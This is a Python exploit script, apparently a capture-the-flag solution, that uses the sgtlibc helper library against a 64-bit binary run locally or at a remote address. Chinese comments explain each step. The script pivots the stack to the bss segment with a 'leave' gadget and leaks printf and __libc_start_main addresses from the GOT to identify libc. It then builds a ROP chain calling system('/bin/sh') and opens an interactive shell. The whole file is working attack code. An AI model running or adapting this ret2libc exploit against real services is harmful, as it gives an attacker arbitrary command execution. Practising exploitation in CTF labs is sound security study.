import sgtlibc
import sgtlibc.utils.shell
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=True,
    file='./test',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

payload = []
align_len = 0x100  # 用于迁移后的rop
bss_addr = 0x00601800 - align_len - 8  # 直接用固定值0x601800，页对齐有0x1000可用
main_addr = 0x04006D2  # elf.symbols['main']


def migration():
    sla('how long is your name: ', str(0x200))  # 该题是要求输入可用大小
    sa('and what\'s you name? ', [b'a' * 128,
       bss_addr, elf.rop['leave']])  # 使用leave完成栈迁移
    sla('how long is your name: ', str(0x200))  # 该题是要求输入可用大小


def exp():
    return [b'a' * align_len]


def leak(func: str):
    migration()

    log.warning(f'start leak {func}')
    payload = [exp()]  # 寻找一个直接ret的函数
    # payload += [[0] * 0x15] # 地址过低导致旁边有got表，通过此升栈以避开
    payload += [elf.rop['rdi'], elf.got[func], elf.plt['printf'], main_addr]
    # sla(b' input\n',payload)

    sa(b'and what\'s you name? ', payload)
    # sl(payload)
    # ru(fakeebp())  # 如果有输出则清空缓存

    data = rc(6).ljust(8, b'\0')
    log.info(f'data:{data}')
    data = uc(data)
    log.warning(f'leak {func}:{hex(data)}')
    s.add_condition(func, data)
    return data


pause()
# leak('printf')
leak('printf')
# leak('stdout')
# leak('stdin')
leak('__libc_start_main')

# libc = ELF('libc_buu-2.23_x64.so', checksec=False)
# offset = addr - libc.symbols['__libc_start_main']
# system_addr = libc.symbols['system'] + offset
# binsh_addr = next(libc.search(b'/bin/sh')) + offset

data = s.dump(db_index=3)  # choose your system index
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
ret_addr = elf.rop['ret']  # sometime maybe wrong
payload = exp()  # + p00(ret_addr)  # 栈平衡
payload += [elf.rop['rdi'], binsh_addr, system_addr]
sl(payload)
migration()
interactive()
